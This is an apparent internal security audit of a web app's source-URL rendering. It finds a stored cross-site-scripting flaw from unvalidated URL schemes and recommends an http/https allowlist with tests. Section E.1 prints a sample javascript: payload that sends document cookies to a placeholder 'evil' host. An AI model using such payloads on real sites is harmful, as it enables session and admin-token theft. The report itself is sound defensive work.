# D-104A — Source URL / Citation Safety & Readability Audit

**Date:** 2026-06-10
**Mode:** Audit only — no code changes, no backend/D1/Wrangler/live mutation.
**Baseline:** hardening-smoke-test 340 / belief-engine-static-check 24 / worker-route-static-check 39

> ⚠ This audit surfaces a **HIGH-severity stored-XSS vector** in source-URL rendering (Section E.1). No exploit was run and no data was touched — finding is from static reading only.

---

## A. Files Inspected

| File | Focus |
|---|---|
| `public/app-v10.js` | `sourceLink`, `esc`, `evidenceMeta`, `evidenceBodyHtml`, `looksLikeJson`, `sectionEvidence`, `reusedItemCompact`, `addCaseItem` (evidence submit) |
| `public/index.html` | `eSource` evidence source input |
| `public/styles.css` | `.source`, `.ev-no-source`, `.reused-item-compact`, `.pill` |
| `src/worker.js` | `sourceUrl` / `source_url` storage + return path |
| `scripts/hardening-smoke-test.mjs` | source/URL test coverage |
| `docs/D-103A`, `D103B`, `D103D`, `D102A`, `README.md` | prior evidence-display state |

---

## B. Source Display / Input Flow Map

```
INPUT (index.html):
  <input id="eSource" placeholder="Source URL, optional">   ← plain text input, no type="url", no pattern

SUBMIT (addCaseItem):
  payload.sourceUrl = document.getElementById('eSource').value   ← raw, no validation/normalisation
  POST /api/evidence | /api/pressure

BACKEND (worker.js):
  stores sourceUrl as-is; returns source_url || sourceUrl   ← no scheme check, no sanitisation

DISPLAY (sourceLink, called from evidenceItem / evidenceCard / reusedItemCompact):
  if(!url)  → <p class="ev-no-source">no source provided</p>     (D-103B)
  else      → const safe = esc(url);
              <p class="small source"><a href="${safe}" target="_blank" rel="noopener noreferrer">${safe}</a></p>

esc(s): escapes & < > " '   ← HTML-metachar escaping ONLY; does NOT validate URL scheme
```

---

## C. Current Source URL Safety Behavior

| Aspect | Behavior | Assessment |
|---|---|---|
| HTML escaping | `esc()` escapes `& < > " '` in both `href` and link text | ✅ prevents attribute-breakout XSS (cannot inject new attributes/handlers) |
| `target` | `_blank` | ✅ opens in new tab |
| `rel` | `noopener noreferrer` | ✅ prevents reverse-tabnabbing + referrer leak |
| Scheme validation | **none** — any scheme goes straight into `href` | 🔴 **see E.1** |
| Normalisation | none — protocol-relative / scheme-less stored raw | 🟡 see E.2 |
| Long-URL layout | `.source{word-break:break-all}`; reused rows flex-wrap | ✅ acceptable |
| Displayed label | full raw URL (escaped) | ✅ honest, no "verified" implication |
| Input validation | none (`type="text"`, no pattern, no submit check) | 🟡 UX-level only |

---

## D. Current Trust Wording Around Sources

| Signal | State |
|---|---|
| "no source provided" (D-103B) | ✅ missing source clearly weaker, muted/italic |
| "verified" / "trusted source" wording | ✅ none present (confirmed across app-v10.js) |
| Source presence vs reliability | ✅ UI shows *presence* (a link or "no source") and never claims the source was checked |
| Quality tier vs source | ✅ separate signals (D-103B quality pill + source line) |

Trust **wording** is in good shape post-D-103B. The gap is **safety**, not wording.

---

## E. Security / Layout Risks (Ranked by Severity)

### E.1 — HIGH (security): No URL scheme validation → stored-XSS via `javascript:` / `data:` source

`sourceLink` places `esc(url)` directly into `href`. `esc()` only escapes HTML metacharacters — it does **not** restrict the URL scheme. A submitted source such as:

```
javascript:fetch('https://evil/x?c='+document.cookie)
```

is stored verbatim (backend does no validation) and rendered as:

```html
<a href="javascript:fetch(...)" target="_blank" rel="noopener noreferrer">javascript:fetch(...)</a>
```

Clicking the link executes attacker JavaScript **in the HumanX origin** — a stored cross-site-scripting vector. `data:text/html,…`, `vbscript:`, `blob:`, and `file:` schemes are likewise unfiltered.

**Aggravating factor:** evidence enters **Review before going public**, so the *first* person to click a malicious source link is typically a **moderator using the admin token** — making this an **admin-targeting** stored XSS (potential admin-token/session compromise), in addition to the public risk once approved.

**Existing partial mitigations (do not rely on):**
- `esc()` escapes quotes → no attribute breakout (cannot add `onclick=` etc.). ✅ that vector is closed.
- `rel="noopener noreferrer"` + modern browsers increasingly block top-level `javascript:` navigation from `target="_blank"` anchors. ⚠ Inconsistent across browsers/versions; **must not** be the only defense.

**Fix direction:** whitelist `http:`/`https:` (optionally `mailto:`); anything else is rendered as **plain escaped text**, never as an `href`.

### E.2 — MEDIUM (security/UX): Protocol-relative and scheme-less URLs

- `//evil.com/x` (protocol-relative) → resolves to `https://evil.com/x` and navigates off-site, bypassing any naive "starts with http" check.
- `evil.com` (no scheme) → becomes a **relative** link (`https://humanx…/<view>/evil.com`) — broken/confusing, and could collide with app routes.

No normalisation today. The E.1 fix (require an explicit `http(s):` scheme via `new URL()` parsing) also resolves this — scheme-less and protocol-relative values fail the whitelist and render as text.

### E.3 — LOW (layout): Long URLs

`.source{word-break:break-all}` wraps long URLs; reused compact rows use `flex-wrap`. No overflow risk observed. ✅ No action.

### E.4 — LOW (UX): Source input has no `type="url"` / hint

`<input id="eSource">` is plain text with no `type="url"`, pattern, or helper note. Minor UX gap; not a security control (client validation is bypassable). A soft `type="url"` + "http(s) links only" hint would help users, but the real control must be at render time.

---

## F. Trust / Confusion Risks (Ranked)

### F.1 — LOW: A rendered link could imply endorsement
A clickable blue source link may read as "HumanX vouches for this source." Mitigated by the absence of any "verified/trusted" wording and the D-103B quality tiers. Acceptable; could be reinforced by a tiny "user-submitted link" cue, but not required.

### F.2 — INFO: Missing source already handled well
"no source provided" (D-103B) makes absence clearly weaker. ✅

### F.3 — INFO: No reliability claim
The UI distinguishes *presence* from *reliability* and never asserts a source was checked. ✅ Preserve this — the E.1 fix must **not** introduce any "unsafe"/"blocked" wording that implies HumanX judged the *content*; frame it as "not a valid web link" (format-based, neutral).

---

## G. Existing Test Coverage

| Covered | Test |
|---|---|
| Missing source → "no source provided" | D-103B (line ~2854) |
| Importer source-needed guard | D-59 (line ~1216, different context) |

**Gap:** no test asserts scheme safety, `rel="noopener"`, `href` escaping, or that non-http(s) schemes are not rendered as links. This is the coverage hole D-104B should close.

---

## H. Recommended D-104B Patch

### H.1 — Safe frontend-only (display / sanitisation) — **RECOMMENDED (security fix)**

| ID | Change | Risk | Addresses |
|---|---|---|---|
| W-1 | **Add a `safeHttpUrl(url)` helper** that parses with `new URL(url)` and returns the URL only if `protocol` is `http:` or `https:` (optionally `mailto:`); otherwise returns null. | Low — pure function | E.1, E.2 |
| W-2 | **`sourceLink` uses `safeHttpUrl`:** if safe → render the anchor as today (`target=_blank rel="noopener noreferrer"`, escaped); if unsafe/unparseable → render the value as **plain escaped text** with a muted neutral note like "source link not a valid web address (not clickable)" — never put it in `href`. | Low — display branch | E.1, E.2 |
| W-3 | **(Optional) `type="url"` + hint on `eSource`** input ("http(s) links only") as a soft UX hint — not a security control. | Very low | E.4 |

**Smallest meaningful patch:** W-1 + W-2 — they close the HIGH stored-XSS vector and the protocol-relative/scheme-less issue in one render-time guard, with no backend dependency. Keep the existing `rel="noopener noreferrer"` as defense-in-depth.

**Copy rule for the unsafe case:** neutral, format-based ("not a valid web address / not clickable") — **not** "unsafe", "malicious", "blocked", or any content judgement, to preserve source-neutrality (F.3).

### H.2 — Needs backend / schema / API thought
| ID | Change | Why deferred |
|---|---|---|
| BE-1 | **Server-side scheme validation** of `sourceUrl` on `/api/evidence` + `/api/pressure` (reject/normalise non-http(s)) as defense-in-depth | Backend/Worker change — out of scope for a frontend audit, but recommended as a follow-up so bad data never enters D1 |
| BE-2 | Backfill check of existing stored `source_url` values for non-http(s) schemes | Read-only D1 query first; any cleanup is a separate admin/manual op |

### H.3 — Admin / manual operations only
| ID | Item |
|---|---|
| OPS-1 | If BE-2 finds existing `javascript:`/`data:` source rows, remediate via the normal review/edit path (exact-ID, no bulk) — **not** part of D-104B |

### H.4 — Do not build
| ID | Reason |
|---|---|
| DN-1 | Link preview / fetching the source server-side | SSRF risk; also implies verification |
| DN-2 | Domain reputation / blocklists | Maintenance burden + implies HumanX judges source reliability (F.3 violation) |
| DN-3 | Auto-deleting/hiding evidence with bad URLs | No-hide policy; render safely instead |
| DN-4 | "Verified"/"safe source" badges | Implies verification |

---

## I. Suggested Hardening Tests for D-104B

| # | Test |
|---|---|
| 1 | `safeHttpUrl` (or equivalent) helper exists and is referenced by `sourceLink` |
| 2 | `sourceLink` does **not** emit `href="javascript:` for a `javascript:` input (rendered as text) |
| 3 | `sourceLink` does **not** emit `href="data:`/`vbscript:`/`file:`/`blob:` for those schemes |
| 4 | `http://` and `https://` URLs **do** render as an `<a href=...>` link |
| 5 | Anchor still carries `rel="noopener noreferrer"` and `target="_blank"` |
| 6 | Unsafe/invalid source renders neutral "not a valid web address"-style text (no "unsafe"/"malicious"/"verified" wording) |
| 7 | Missing source still renders "no source provided" (D-103B regression) |
| 8 | `esc()` still applied to the displayed source value (escaping regression) |
| 9 | No backend/D1/wrangler/deploy references added in the helper |

Tests 7–8 are regression locks.

---

## J. Final D-104B Recommendation

**Implement H.1 W-1 + W-2 as a small frontend-only sanitisation pass, with hardening tests I.1–I.8 — and open a follow-up for H.2 BE-1 (server-side scheme validation as defense-in-depth).**

Rationale:
- **E.1 is a genuine HIGH-severity stored-XSS vector** and the most serious finding of the entire D-93→D-104 run. `esc()` closes attribute-breakout but not scheme injection; `javascript:`/`data:` source URLs flow input → D1 → `href` unfiltered, and the first clicker is typically an **admin-token-holding moderator**. A render-time scheme whitelist (`new URL()` → allow only http/https) closes it immediately, frontend-only, no backend dependency.
- It simultaneously fixes E.2 (protocol-relative/scheme-less) since those fail `new URL()` scheme parsing.
- Trust **wording** is already correct post-D-103B, so D-104B is purely a *safety* fix — and must stay neutral (format-based "not a valid web address", never content judgement) to preserve source-neutrality.
- Recommend a **follow-up backend ticket (BE-1)** to validate `sourceUrl` server-side so malicious values never persist in D1 — defense-in-depth, but a separate Worker-change task.

Severity note: although this is a clarity-run audit, **E.1 is a real security bug**, not a cosmetic gap. D-104B should be prioritised accordingly.

---

## K. No Mutation Confirmation

> No code changes were made during this audit.
> No Wrangler, D1, backend, schema, or admin moderation actions were performed.
> No live data was mutated. No admin token was used. No exploit was executed.

---

## L. Static Check Results (post-audit)

| Check | Result |
|---|---|
| `node scripts/hardening-smoke-test.mjs` | **340 passed, 0 failed** |
| `node scripts/belief-engine-static-check.mjs` | **All hard checks passed (24)** |
| `node scripts/worker-route-static-check.mjs` | **All hard checks passed (39)** |
